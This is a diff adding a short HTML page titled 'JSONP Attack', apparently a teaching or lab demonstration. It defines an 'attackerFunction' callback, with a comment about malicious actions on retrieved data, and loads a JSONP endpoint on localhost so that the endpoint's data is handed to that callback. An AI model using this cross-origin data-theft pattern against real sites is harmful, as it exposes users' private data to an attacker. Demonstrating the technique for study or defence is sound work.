@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>JSONP Attack</title>
+    <script>
+        function attackerFunction(data) {
+            // Perform malicious actions with the retrieved data
+            console.log(data);
+            // ...
+        }
+    </script>
+</head>
+
+<body>
+    <script src="http://localhost:3000/api?callback=attackerFunction"></script>
+</body>
+
+</html>
